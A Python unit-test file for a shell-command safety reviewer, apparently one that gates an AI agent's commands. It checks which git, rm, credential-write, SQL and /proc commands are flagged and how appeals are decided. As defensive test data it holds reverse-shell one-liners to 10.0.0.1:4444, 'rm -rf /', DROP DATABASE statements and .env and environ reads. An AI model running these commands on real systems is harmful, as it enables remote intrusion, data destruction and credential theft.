"""v1.3.0 dynamic tests: accident-family guards, inert-payload safety,
appeal soft-secret gate, and the provable no-op refusal override.

All command strings are inert test data — nothing is executed.
"""
from __future__ import annotations

import importlib.util
import unittest
from pathlib import Path

SCRIPT = (Path(__file__).parents[1] / "src" / "security"
          / "jev-reviewer.py")
SPEC = importlib.util.spec_from_file_location("jev_v130_under_test", SCRIPT)
assert SPEC is not None and SPEC.loader is not None
jev = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(jev)


class TestAccidentGuards(unittest.TestCase):
    """Deterministic coverage for good-faith accident families."""

    def test_git_work_loss_flagged(self) -> None:
        for cmd in (
            "git stash clear",
            "git stash drop",
            "git reflog expire --expire=now --all",
            "git gc --prune=now",
            "git reset --hard",
            "git reset --hard HEAD",
            "git checkout -- .",
            "git checkout -- src/",
            "git restore src/",
            "git clean -fdx",
            "git clean -fdx .",
            "git push --force origin main",
        ):
            self.assertIsNotNone(
                jev._guard_hit(cmd, armed=set()), cmd)

    def test_git_safe_forms_allowed(self) -> None:
        for cmd in (
            "git stash push -m wip",
            "git clean -ndx",
            "git clean -fdx -- node_modules dist",
            "git reset --soft HEAD~1",
            "git restore --staged --source=HEAD src/main.py",
            "git checkout -b feature/x",
            "git push --force-with-lease origin main",
        ):
            self.assertIsNone(jev._guard_hit(cmd, armed=set()), cmd)

    def test_empty_var_glob_flagged_unless_guarded(self) -> None:
        self.assertIsNotNone(
            jev._guard_hit('rm -rf "$EMPTY_DIR"/*', armed=set()))
        self.assertIsNotNone(
            jev._guard_hit('OUT=; rm -rf "$OUT"/*', armed=set()))
        self.assertIsNotNone(
            jev._guard_hit('rm -rf $DEPLOY_ROOT/*', armed=set()))
        # Guarded forms: `&&`-joined `test -n` or in-segment ${V:?} —
        # deletion provably cannot run on an empty value.
        self.assertIsNone(jev._guard_hit(
            'OUT=; test -n "$OUT" && rm -rf "$OUT"/*', armed=set()))
        self.assertIsNone(jev._guard_hit(
            'rm -rf "${OUT:?missing}"/*', armed=set()))
        # `test -z` is the opposite guard, `;`-separated tests do not
        # control the rm, and ${V:-}/:= defaulting still runs it.
        self.assertIsNotNone(jev._guard_hit(
            'OUT=; test -z "$OUT" && rm -rf "$OUT"/*', armed=set()))
        self.assertIsNotNone(jev._guard_hit(
            'OUT=; test -n "$OUT"; rm -rf "$OUT"/*', armed=set()))
        # ${V:-def} defaults to a real path — not the empty-var family;
        # it is judged by the model, not deterministically flagged.
        self.assertIsNone(jev._guard_hit(
            'rm -rf "${OUT:-/tmp}"/*', armed=set()))

    def test_bare_star_rm_flagged_but_cd_guarded(self) -> None:
        self.assertIsNotNone(jev._guard_hit("rm -rf *", armed=set()))
        self.assertIsNotNone(
            jev._guard_hit("cd missing; rm -rf *", armed=set()))
        # `cd missing && rm -rf *`: rm only runs if cd succeeded.
        self.assertIsNone(
            jev._guard_hit("cd missing && rm -rf *", armed=set()))

    def test_durable_overwrite_flagged(self) -> None:
        ev = frozenset({"/home/user/project/production.db",
                        "/home/user/project/data/app.db",
                        "/home/user/project/app.db"})
        for cmd in ("cp seed.db production.db",
                    "mv /tmp/seed.db data/app.db",
                    "rsync -a seed.db app.db"):
            self.assertIsNotNone(jev._guard_hit(
                cmd, armed=set(), evidence=ev,
                cwd="/home/user/project"), cmd)
        # Without evidence the target exists, writes go to the model —
        # creating a fresh file is normal scaffolding.
        self.assertIsNone(jev._guard_hit(
            "cp seed.db production.db", armed=set(),
            evidence=frozenset(), cwd="/home/user/project"))
        self.assertIsNone(jev._guard_hit(
            "cp seed.db production.db", armed=set()))
        # Backups to temp and interactive copies stay allowed.
        self.assertIsNone(jev._guard_hit(
            "cp seed.db /tmp/seed-copy.db", armed=set(), evidence=ev,
            cwd="/home/user/project"))

    def test_cred_write_flagged(self) -> None:
        ev = frozenset({"/home/u/project/.env"})
        self.assertIsNotNone(jev._guard_hit(
            "install -m 644 /tmp/empty.env /home/u/project/.env",
            armed=set(), evidence=ev, cwd="/home/u/project"))
        self.assertIsNotNone(jev._guard_hit(
            "cat > .env <<EOF\nKEY=x\nEOF", armed=set(), evidence=ev,
            cwd="/home/u/project"))
        # Creating a NEW .env (no existence evidence) goes to the model.
        self.assertIsNone(jev._guard_hit(
            "cat > .env <<EOF\nKEY=x\nEOF", armed=set(), evidence=ev,
            cwd="/home/u/other"))
        # A rename of a credential is not an overwrite-with-new-material.
        self.assertIsNone(jev._guard_hit(
            "mv ~/.ssh/id_rsa ~/.ssh/id_rsa.old", armed=set()))

    def test_cred_read_no_longer_matches_write_direction(self) -> None:
        # `cat > .env` used to trip cred-read; an existing .env write now
        # lands on the evidence-gated cred-write overwrite rule.
        ev = frozenset({"/home/u/project/.env"})
        hit = jev._guard_hit("cat > .env", armed=set(), evidence=ev,
                             cwd="/home/u/project")
        self.assertIsNotNone(hit)
        self.assertIn("cred-write", hit)
        self.assertIsNone(jev._guard_hit("cat > .env", armed=set(),
                                         evidence=frozenset()))

    def test_heredoc_write_then_exec_rescanned(self) -> None:
        cmd = "cat > /tmp/x.sh <<EOF\nrm -rf /\nEOF\nbash /tmp/x.sh"
        hit = jev._guard_hit(cmd, armed=set())
        self.assertIsNotNone(hit)
        # Writing the same payload without executing stays allowed.
        self.assertIsNone(jev._guard_hit(
            "cat > /tmp/x.sh <<EOF\nrm -rf /\nEOF", armed=set()))

    def test_inert_payloads_still_allowed(self) -> None:
        for cmd in (
            "cat > /tmp/fix.sh <<'EOF'\nrm -rf /home/user/project\nEOF",
            "cat <<'EOF'\nrm -rf /home/user/project\nEOF",
            "printf '%s\\n' 'sudo rm -rf /' > docs/safety.md",
            "echo 'DROP TABLE users;' > sql/examples/drop.sql",
            "cat blob.b64 | base64 -d > /tmp/out.bin",
        ):
            self.assertIsNone(jev._guard_hit(cmd, armed=set()), cmd)


class TestNoopRefused(unittest.TestCase):
    """Provable no-op commands clear a deny."""

    def test_rm_refused_operands(self) -> None:
        for cmd in ("rm -rf .", "rm -rf ./", "rm -rf ..", "rm -rf ../",
                    "rm -rf ../../", "rm -rf . .."):
            self.assertTrue(jev._rm_noop_refused(cmd), cmd)

    def test_abort_expansion_is_not_a_static_noop_proof(self) -> None:
        # Do not infer runtime variable state to force-clear a model denial.
        self.assertFalse(
            jev._rm_noop_refused('OUT=; rm -rf "${OUT:?missing}"/*'))
        # Unknown/environment D may be set — NOT a provable abort; the
        # command is not a no-op and the model must judge it.
        self.assertFalse(
            jev._rm_noop_refused('rm -rf "${D:?}"; echo hi'))
        self.assertFalse(
            jev._rm_noop_refused('OUT=src; rm -rf "${OUT:?}"/*'))

    def test_future_assignment_and_expansion_side_effects_are_not_noops(self) -> None:
        for command in (
            'OUT=src; rm -rf "${OUT:?}"; OUT=',
            'OUT=; OUT=src; rm -rf "${OUT:?}"',
            'OUT= | rm -rf "${OUT:?}"',
            'OUT=; printf "%s" "$(python3 change_data.py)" "${OUT:?}"',
            'printf "%s" "${OUT:?}"; OUT=',
            'rm -rf .; echo hi',
        ):
            self.assertFalse(jev._rm_noop_refused(command), command)

    def test_real_destruction_not_noop(self) -> None:
        for cmd in ("rm -rf /home/user/project",
                    "rm -rf src",
                    "rm -rf $EMPTY/*; rm -rf .",
                    "rm -rf .; rm -rf /",
                    "git clean -fdx",
                    "rm -f file.txt",
                    # review findings: redirection and substitution are
                    # real side effects — never no-op leads
                    "echo '' > data/customers.csv",
                    "X=$(id)",
                    "VAR=`whoami`",
                    "echo hi > /tmp/x && rm -rf ."):
            self.assertFalse(jev._rm_noop_refused(cmd), cmd)

    def test_inert_payloads_in_exec_masked_text(self) -> None:
        # Stored payloads must not re-trigger raw-text accident scans:
        # SQL inside a file-written heredoc, $VAR inside a non-executor
        # single-quoted string written to a fixture.
        inert = (
            "cat > tests/x <<'EOF'\npsql prod -c 'DROP DATABASE prod;'"
            "\nEOF",
            "printf '%s' 'rm -rf \"$DIR\"/*' > tests/x",
            "cat <<'EOF'\nDELETE FROM users;\nEOF",
            "echo 'DROP TABLE users;' > sql/examples/drop.sql",
        )
        for cmd in inert:
            self.assertIsNone(jev._guard_hit(cmd, armed=set()), cmd)
        # The same text reaching a DB client or a -c executor executes.
        self.assertIsNotNone(jev._guard_hit(
            "sqlite3 app.db 'DELETE FROM customers;'", armed=set()))
        self.assertIsNotNone(jev._guard_hit(
            "psql -h db -c 'DROP TABLE users CASCADE'", armed=set()))
        self.assertIsNotNone(jev._guard_hit(
            "bash -c 'rm -rf \"$DIR\"/*'", armed=set()))
        # SQL piped into a remote client is a remote-category hit that an
        # armed=filesystem grant must NOT lift.
        lifted: list = []
        hit = jev._guard_hit("echo 'DROP DATABASE prod' | psql -h db",
                             armed={"filesystem"}, lifted=lifted)
        self.assertIsNotNone(hit)
        self.assertIn("sql-mass-delete", hit)

    def test_git_clean_dry_run_and_no_force(self) -> None:
        for cmd in ("git clean -ndx", "git clean -n -f",
                    "git clean --dry-run -f", "git clean -dx",
                    "git clean -fdx -- node_modules dist"):
            self.assertIsNone(jev._guard_hit(cmd, armed=set()), cmd)
        for cmd in ("git clean -fdx", "git clean -ffd", "git clean -f"):
            self.assertIsNotNone(jev._guard_hit(cmd, armed=set()), cmd)

    def test_dev_tcp_probe_vs_attached_shell(self) -> None:
        # Mirrors classifier.ts hasAttachedDevSocket semantics: bare
        # connectivity probes are NOT a floor (model reviews them);
        # a shell or stdio attached to the socket IS a floor.
        probes = (
            'exec 3<>/dev/tcp/127.0.0.1/9222 && exec 3<&- 3>&-',
            "timeout 5 bash -c 'exec 3<>/dev/tcp/127.0.0.1/5037 "
            "&& head -c 100 <&3'",
            "echo x > /dev/tcp/127.0.0.1/8080",
        )
        for cmd in probes:
            self.assertIsNone(jev._guard_hit(cmd, armed=set()), cmd)
        attached = (
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            "sh -i >& /dev/tcp/10.0.0.1/4444",
            "exec <> /dev/tcp/10.0.0.1/4444",
            "bash -i >& /dev/udp/10.0.0.1/53",
            "nc -e /bin/sh 10.0.0.1 4444",
            "mkfifo /tmp/f | cat /tmp/f | sh -i 2>&1 | "
            "nc 10.0.0.1 4444 > /tmp/f",
            "socat TCP:10.0.0.1:4444 EXEC:/bin/sh",
        )
        for cmd in attached:
            self.assertIsNotNone(jev._guard_hit(cmd, armed=set()), cmd)

    def test_proc_environ_filtered_vs_raw(self) -> None:
        # Name-filtered environ reads are diagnostics (model decides);
        # raw dumps still flag.
        self.assertIsNone(jev._guard_hit(
            "cat /proc/2594/environ | tr '\\0' '\\n' | grep -i home",
            armed=set()))
        self.assertIsNotNone(jev._guard_hit(
            "cat /proc/2594/environ | tr '\\0' '\\n' | head",
            armed=set()))
        self.assertIsNotNone(jev._guard_hit(
            "cat /proc/2594/environ", armed=set()))

    def test_noop_override_clears_model_deny(self) -> None:
        answers = _allow_answers_like()
        answers["destructive"] = {"type": "noul", "noul": 0.95}
        answers["decision"] = {"type": "choice",
                               "probabilities": {"deny": 0.99,
                                                 "allow": 0.01}}
        answers["ap_appeal_decision"] = {
            "type": "choice",
            "probabilities": {"deny": 0.9, "allow": 0.1}}
        answers["ap_floor_recheck"] = {"type": "noul", "noul": 0.9}
        answers["ap_reconsidered_harm"] = {"type": "noul", "noul": 0.9}

        def fake_call(state, questions, model, timeout, api_key):
            return {"answers": answers, "usage": None, "latency_ms": 1.0}

        orig = jev.jev_call
        jev.jev_call = fake_call
        try:
            res = jev.review_request(
                {"command": "rm -rf ."}, model="m", timeout=1.0,
                api_key="k", thresholds=dict(jev.DEFAULT_THRESHOLDS))
            self.assertFalse(res["deny"])
            self.assertTrue(
                res["verdict_detail"]["appeal"].get("noop_refused"))
        finally:
            jev.jev_call = orig


class TestAppealSoftSecretGate(unittest.TestCase):
    """A soft secret_exposure signal gates appeals (X-076 regression)."""

    def test_soft_secret_blocks_appeal_lift(self) -> None:
        answers = _allow_answers_like()
        answers["decision"] = {"type": "choice",
                               "probabilities": {"deny": 0.8,
                                                 "allow": 0.2}}
        answers["secret_exposure"] = {"type": "score", "score": 1.86}
        answers["ap_appeal_decision"] = {
            "type": "choice",
            "probabilities": {"deny": 0.2, "allow": 0.8}}
        answers["ap_floor_recheck"] = {"type": "noul", "noul": 0.02}
        answers["ap_reconsidered_harm"] = {"type": "noul", "noul": 0.24}
        answers["ap_appeal_scope"] = {
            "type": "choice",
            "probabilities": {"scoped_own": 0.94, "broad_system": 0.06}}
        answers["ap_appeal_secret_destination"] = {
            "type": "choice",
            "probabilities": {"yes_exfil": 0.89, "own_service": 0.11}}

        def fake_call(state, questions, model, timeout, api_key):
            return {"answers": answers, "usage": None, "latency_ms": 1.0}

        orig = jev.jev_call
        jev.jev_call = fake_call
        try:
            res = jev.review_request(
                {"command": "python3 -c 'print(open(\".env\").read())'"},
                model="m", timeout=1.0, api_key="k",
                thresholds=dict(jev.DEFAULT_THRESHOLDS))
            self.assertTrue(res["deny"])
            self.assertTrue(
                res["verdict_detail"]["appeal"].get("soft_secret_gate"))
        finally:
            jev.jev_call = orig

    def test_soft_secret_own_service_still_lifts(self) -> None:
        answers = _allow_answers_like()
        answers["decision"] = {"type": "choice",
                               "probabilities": {"deny": 0.8,
                                                 "allow": 0.2}}
        answers["secret_exposure"] = {"type": "score", "score": 1.2}
        answers["ap_appeal_decision"] = {
            "type": "choice",
            "probabilities": {"deny": 0.1, "allow": 0.9}}
        answers["ap_floor_recheck"] = {"type": "noul", "noul": 0.05}
        answers["ap_reconsidered_harm"] = {"type": "noul", "noul": 0.1}
        answers["ap_appeal_secret_destination"] = {
            "type": "choice",
            "probabilities": {"yes_exfil": 0.05, "own_service": 0.95}}

        def fake_call(state, questions, model, timeout, api_key):
            return {"answers": answers, "usage": None, "latency_ms": 1.0}

        orig = jev.jev_call
        jev.jev_call = fake_call
        try:
            res = jev.review_request(
                {"command": "curl -H \"Authorization: Bearer $TOK\" "
                            "https://api.example.test/me"},
                model="m", timeout=1.0, api_key="k",
                thresholds=dict(jev.DEFAULT_THRESHOLDS))
            self.assertFalse(res["deny"])
        finally:
            jev.jev_call = orig


def _allow_answers_like() -> dict:
    """Fully valid answers for the current question set."""
    answers: dict = {}
    for name, q in jev.build_questions({}).items():
        if not isinstance(name, str) or name.startswith(("ap_", "cat_")):
            continue
        if name == "bypassing":
            continue
        qtype = q.get("type")
        if qtype == "noul":
            answers[name] = {"type": "noul", "noul": 0.0}
        elif qtype == "score":
            answers[name] = {"type": "score", "score": 0}
        elif qtype == "choice":
            answers[name] = {"type": "choice", "choice": "allow"}
    return answers


if __name__ == "__main__":
    unittest.main()
